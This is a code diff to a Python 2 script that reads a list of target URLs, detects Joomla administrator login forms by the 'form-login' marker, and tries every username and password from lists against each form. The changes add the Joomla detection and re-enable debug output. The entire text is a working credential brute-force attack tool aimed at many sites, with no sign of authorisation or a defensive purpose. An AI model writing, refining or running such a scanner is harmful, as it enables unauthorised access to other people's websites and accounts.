@@ -8,6 +8,7 @@ import mechanize
 
 error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
 sussuc = "Control Panel"
+joomla = "form-login"
 br = mechanize.Browser()
 br.set_handle_robots(False)
 fopen = open("/root/scanner/t.txt", "r")
@@ -33,27 +34,27 @@ class bcolors:
 
 for line in fopen.readlines():
     logged = False
-    #print bcolors.BOLD + line.strip() ===============================================
+    print bcolors.BOLD + line.strip()
 
     try:
         page = br.open(line.strip(), timeout=5)
         print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line
 
     except:
-        #print bcolors.WARNING + "Error ocurred"
+        print bcolors.WARNING + "Error ocurred"
         pass
 
     try:
-        for form in br.forms():
-            if form == True:
-                print bcolors.OKBLUE + "login found"
-
+        mainpage = br.response().read()
+        if joomla in mainpage:
+            print bcolors.OKBLUE + "login found"
+            for form in br.forms():
                 for u in userlist:
                     if logged == False:
                         for p in passlist:
                             try:
                                 br.select_form(nr=0)
-                                print bcolors.UNDERLINE + "trying user: %s and password: %s" % (u, p)
+                                print bcolors.UNDERLINE + "trying user: %s and password: %s \n" % (u, p)
                                 br.form["username"] = u
                                 br.form["passwd"] = p
                                 br.submit()
@@ -73,8 +74,8 @@ for line in fopen.readlines():
                             #     else:
                             #         logged = True
                             #         print "success"
-            else:
-                print bcolors.UNDERLINE + "no login page found!!"
+        else:
+            print bcolors.UNDERLINE + "no login page found!!"
 
             # except:
             #          print "I'm out of the loop"
